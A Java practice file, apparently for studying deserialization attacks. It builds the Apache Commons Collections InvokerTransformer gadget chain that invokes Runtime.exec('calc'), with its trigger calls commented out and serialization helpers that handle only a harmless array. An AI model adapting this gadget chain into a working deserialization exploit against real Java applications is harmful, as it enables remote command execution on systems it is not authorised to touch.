package org.main;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;

import java.io.*;

public class Payload {

    public static void main(String[] args) {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{"calc"})});
//        chain.transform(123);

        ChainedTransformer chain2 = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
//                new InvokerTransformer("getMethod", new Class[]{
//                        String.class, Class[].class}, new Object[]{
//                        "getRuntime", new Class[0]}),
//                new InvokerTransformer("invoke", new Class[]{
//                        Object.class, Object[].class}, new Object[]{
//                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{"calc"})});
//        chain2.transform(123);
        testSer(new Object[]{"calc"});
        testDeser();


//        try {
//            Runtime.getRuntime().exec("calc");
//        } catch (IOException e) {
//            throw new RuntimeException(e);
//        }
    }

    static void testSer(Object obj) {
        String filename = "file.ser";

        // Serialization
        try {
            //Saving of object in a file
            FileOutputStream file = new FileOutputStream(filename);
            ObjectOutputStream out = new ObjectOutputStream(file);

            // Method for serialization of object
            out.writeObject(new Object[]{"Volvo", "BMW", "Ford", "Mazda"});

            out.close();
            file.close();

            System.out.println("Object has been serialized");

        } catch (IOException ex) {
            System.out.println("IOException is caught");
            ex.printStackTrace();
        }
    }

    static void testDeser() {
        Object object1 = null;

        // Deserialization
        try {
            // Reading the object from a file
            FileInputStream file = new FileInputStream("file.ser");
            ObjectInputStream in = new ObjectInputStream(file);

            // Method for deserialization of object
            object1 = in.readObject();
            System.out.println(object1);
            in.close();
            file.close();

//            object1.transform(123);

        } catch (IOException ex) {
            System.out.println("IOException is caught");
            ex.printStackTrace();
        } catch (ClassNotFoundException ex) {
            System.out.println("ClassNotFoundException is caught");
            ex.printStackTrace();
        }
    }
}